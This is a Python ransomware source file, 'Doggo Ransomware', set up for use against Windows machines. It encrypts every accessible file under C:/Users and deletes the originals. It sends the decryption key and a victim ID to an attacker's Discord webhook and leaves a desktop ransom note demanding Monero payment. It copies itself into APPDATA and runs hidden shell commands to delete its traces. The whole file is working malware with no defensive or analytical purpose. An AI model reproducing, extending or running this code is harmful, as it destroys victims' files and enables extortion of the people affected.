import os
import random
import string
import sys
import subprocess
import requests
import shutil
import datetime
import errno
from cryptography.fernet import Fernet
from config import Config

cc = Config()

target_directory = r'C:/Users' # Directory to encrypt
webhook_url = cc.get_ransomware_discord_webhook_url() # Discord Webhook URL
email_adr = cc.get_ransomware_email_adress() # Email Adress where your encryption key will be sent
monero_adr = cc.get_ransomware_monero_wallet_adress() # Monero Wallet Address
cash = cc.get_ransomware_amount_of_money() # Amount of money to receive

timestamp = datetime.datetime.now().isoformat()

def log_error(e):
    data = {
        "username": "Doggo Ransomware",
        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
        "embeds": [
            {
                "title": "Doggo Ransomware Error",
                "url": "https://github.com/gumbobr0t",
                "color": 0xFF3030,
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "ERROR OCCURED",
                        "value": f"`{e}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/gumbobr0t"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

characters = string.ascii_letters + string.digits
user_id = ''.join(random.choice(characters) for i in range(9)) # Creates random user ID

key = Fernet.generate_key() # Creates random AES key
cipher_suite = Fernet(key)

encryptedfiles = [] # Saves all encrypted files

ransom_note = f"""YOUR FILES HAVE BEEN ENCRYPTED!

Your personal ID: {user_id}

Do not try to decrypt your files yourself, it is impossible without the key. 
The only way to get your files back is to pay the ransom.

To get the decryption Program you need to pay ${cash} in monero to the address below:

{monero_adr}

Once you made the payment, you need to write a mail to this email with your personal ID.

Email: {email_adr}

To the skids:
By deleting our webhook you won't reach much. The only thing that will happen is that we don't get the recovery keys anymore.

DO NOT TRY ANYTHING STUPID!""" # Ransom note to display

def send_wh():
    data = {
        "username": "Doggo Ransomware",
        "avatar_url": "https://cdn.discordapp.com/attachments/1148300902051090625/1148326216663842824/doggo.jpg",
        "embeds": [
            {
                "title": "Doggo Ransomware Hit",
                "description": "Hello. It looks like you have hit another person. As soon as they send you an email with their personal ID and you approved their payment, please send them the download link for the decryption tool and give them their key, thanks.",
                "url": "https://github.com/gumbobr0t",
                "color": 0x00FF00,
                "fields": [
                    {
                        "name": "USER ID",
                        "value": f"`{user_id}`",
                        "inline": True
                    },
                    {
                        "name": "TARGET DIR",
                        "value": f"`{target_directory}`",
                        "inline": True
                    },
                    {
                        "name": "DECRYPTION KEY",
                        "value": f"`{key.hex()}`",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "https://github.com/gumbobr0t"
                },
                "timestamp": timestamp
            }
        ]
    }

    try:
        requests.post(webhook_url, json=data)
    except Exception:
        pass

def encrypt_file(file_path):
    encryptedfiles.append(file_path)

    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = cipher_suite.encrypt(file_data)

    encrypted_file_path = file_path + '.doggo.encrypted'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    os.remove(file_path)

def encrypt_directory(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path)
            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                               errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass  # Ignore permission/access errors
            except Exception as e:
                if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                    pass  # Ignore common file errors
                else:
                    log_error(e)

def encrypted_files():
    try:
        with open('DOGGO-RANSOMWARE-ENCRYPTED-FILES.txt', 'w') as file:
            for encryptedfile in encryptedfiles:
                file.write(encryptedfile + '\n')
    except Exception as e:
        log_error(e)

def ransomware():

    current_file = os.path.abspath(sys.argv[0])
    appdata = os.path.join(os.getenv('APPDATA'), 'DOGGO')

    if current_file.startswith(appdata):
        send_wh()
        encrypt_directory(target_directory)
        encrypted_files()

        try:
            desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
            file_path = os.path.join(desktop, 'DOGGO-RANSOMWARE-NOTE.txt')
            with open(file_path, 'w') as f:
                f.write(ransom_note)

            os.startfile(file_path)

            subprocess.Popen('ping localhost -n 3 > NUL && rmdir /S /Q "{}"'.format(appdata), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

            sys.exit()

        except Exception as e:
            log_error(e)

    else:
        try:
            if not os.path.exists(appdata):
                os.mkdir(appdata)

            target_path = os.path.join(appdata, os.path.basename(current_file))
            shutil.copy(current_file, target_path)

            os.startfile(target_path)

            path = sys.argv[0]

            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

            sys.exit()

        except Exception as e:
            log_error(e)

if __name__ == '__main__':
    ransomware()
